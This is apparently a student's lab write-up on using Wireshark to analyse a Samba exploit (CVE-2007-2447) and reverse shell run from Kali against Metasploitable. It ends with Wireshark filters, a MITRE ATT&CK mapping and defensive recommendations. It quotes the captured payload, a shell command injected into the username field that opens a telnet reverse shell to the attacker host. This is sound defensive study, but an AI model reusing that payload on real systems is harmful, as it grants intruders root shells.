Detection 02 — Wireshark Network Analysis



Wireshark is a network protocol analyzer — it captures every packet travelling across a network interface and lets you read them in detail. I used it to analyze my own attacks from a defender's perspective, watching what the Samba exploit and reverse shell looked like on the wire.



Setup



Interface captured: eth0 (Cyberlab network)

Filter used: ip.addr == 10.0.2.3

Attacks captured: Nmap scan, Samba exploit, reverse shell session



What I found — ICMP (Ping)



Ping traffic showed clear echo request and echo reply pairs. Each packet revealed the full network layer breakdown — Frame, Ethernet, IP, ICMP — from Kali (10.0.2.15) to Metasploitable (10.0.2.3).



What I found — TCP Port 139 (Samba Exploit)



Following the TCP stream on port 139 revealed the SMB protocol negotiation and the actual exploit payload in plaintext:



/bin/sh -c '(sleep 4355|telnet 10.0.2.15 4444|while : ; do sh \&\& break; done 2>\&1|telnet 10.0.2.15 4444 >/dev/null 2>\&1 \&)'



This is CVE-2007-2447 visible directly in network traffic. Instead of a legitimate username, Metasploit injected a shell command into the authentication field. Samba executed it as root. Any IDS with a signature for this pattern would have caught it immediately.



What I found — TCP Port 4444 (Reverse Shell)



Following the TCP stream on port 4444 revealed the entire post-exploitation session in plaintext — every command typed and every response received. The root directory listing was fully visible. Zero encryption means any network observer could read the entire session in real time.



This is why modern malware uses HTTPS on port 443 for command and control — so the traffic looks like normal web browsing and the content is encrypted.



Key lessons from the wire



Every step of the attack left network traces. The SMB connection, the payload injection, the reverse shell, and every post-exploitation command — all visible in Wireshark. A defender with network visibility has a complete picture of everything the attacker did.



Unencrypted shells are risky for attackers too. Port 4444 is Metasploit's default and immediately suspicious to any IDS. Real attackers blend into normal traffic using ports 80, 443, or 53 — but deep packet inspection catches those too because the traffic doesn't look like the expected protocol.



The ARP cache revealed active hosts. Running arp -a from inside the compromised machine showed Kali's IP — proving that network connections leave traces not just in logs but in the machine's memory too.



Filters reference



Filter	What it shows

ip.addr == 10.0.2.3	All traffic to/from Metasploitable

icmp	Ping packets

tcp.port == 139	Samba exploit traffic

tcp.port == 4444	Reverse shell session



MITRE ATT\&CK Mapping



Technique	          ID	  What was visible



Network Sniffing	T1040	Full packet capture

Exploit Public App	T1190	Payload in TCP stream

Non-Standard Port	T1571	Port 4444 reverse shell



Defensive recommendations



Threat	Detection	Mitigation

Unencrypted C2	Deep packet inspection	Enforce TLS everywhere

Non-standard ports	Port anomaly alerting	Strict firewall egress rules

SMB exploitation	IDS signatures for CVE-2007-2447	Patch and disable SMB if unused

Reverse shells	Outbound connection monitoring	Application whitelisting

